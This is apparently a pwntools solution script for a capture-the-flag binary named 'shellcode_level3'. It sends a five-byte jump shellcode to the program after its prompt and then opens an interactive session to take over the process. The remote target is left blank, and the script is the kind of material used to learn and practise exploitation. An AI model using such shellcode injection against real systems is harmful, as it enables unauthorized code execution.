#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

#context.log_level = 'debug'
debug = 1

if debug:
    io = process('./shellcode_level3')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]
sc = b"\xE9\x48\xD1\xFF\xFF"
#p()
io.sendlineafter(b"neng miao sha wo?", sc)

io.interactive()

